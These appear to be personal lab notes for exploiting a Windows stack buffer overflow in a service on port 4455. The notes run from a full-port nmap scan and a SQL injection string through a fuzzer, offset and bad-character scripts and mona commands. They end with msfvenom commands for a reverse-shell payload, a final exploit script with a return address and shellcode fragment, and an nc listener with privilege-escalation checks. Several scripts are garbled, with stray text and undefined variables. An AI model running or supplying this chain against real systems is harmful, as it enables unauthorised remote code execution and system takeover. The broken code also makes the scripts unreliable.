# Service Enumeration
```python
nmap -sC -sV -Pn -n -p- --min-rate=400 --min-parallelism=512 [ip]
```
# Active Connection
```python
netstat -anop tcp
```

# Script 1
Before Immunity Debugger

SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"

```python
import socket,sys,time

RHOST=""
RPORT=4455
timeout=5

buffer_list=[]
counter=200

while len(buffer_list) < 50:
    buffer_list.append(b"A" * counter)
    counter += 200

for buf in buffer_list:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((RHOST, RPORT))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(buf))
        s.send(b"OVRFLW " + buf + b"\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + RHOST + ":" + str(RPORT))
        sys.exit(0)
    time.sleep(2)
```
```
msf-pattern_create -l 1200
```

```python
#!/usr/bin/env python3
import socket
from PARAMETERS import RHOST, RPORT, buf_totlen

RHOST=""
RPORT=4455

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
buf=b""
buf +=
 (b"buf")

buf += b"\n"

s.send(b"OVRFLW " + buf + b"\n")clea
```
```
!mona findmsp -distance
```
```python
#!/usr/bin/python3
import socket
RHOST=""
RPORT=4455

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

prefix=b"OVRFLW "
offset=1189
buf=b"A"
retn=b"BBBB"
post=b"\n\r"
s.send(prefix + (buf*offset) + retn+post)
s.recv(1024)
```

```python
import socket
RHOST=""
RPORT=4455
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
prefix=b"OVRFLW "
offset=1189
buf=b"A"
retn=b"BBBB"
post=b"\n\r"
badchars=b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10"
pad=b""badchars+=b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars+=b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars+=b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars+=b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars+=b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars+=b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars+=b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars+=b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars+=b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars+=b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars+=b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars+=b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars+=b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars+=b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars+=b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

s.send(prefix + (buf*offset) + retn+pad+badchard+post)
s.recv(1024)
```
```
!mona jmp -r esp "\x00\x04\x05\x14\x15\x7C\x7D\x97\x98\xB1\xB2"
```
create msfvenom
```python
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=665 -b 'x00\x04\x05\x14\x15\x7C\x7D\x97\x98\xB1\xB2' -f python

msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -b 'x00\x04\x05\x14\x15\x7C\x7D\x97\x98\xB0\xB1\xB2' -f python

```

```python
#!/usr/bin/env python3
import socket,sys

eip=b"\x83\x66\x32\x6a"
buf=b""
buf+=b"\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81"
buf+=b""

shell=b""
shell+=b"OVRFLW "
shell+=b"\x41"*1189
shell+=eip
shell+=b"\x90"*10
shell+=buf
shell+=b"C" * (1811-len(shell))
shell+=b"\r\n"

RHOST=""
RPORT=4455

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
s.send(shell)
s.recv(1024)
s.close()
```

```python
nc -nlvp 665

whoami

ipconfig

sharpup.exe audit
```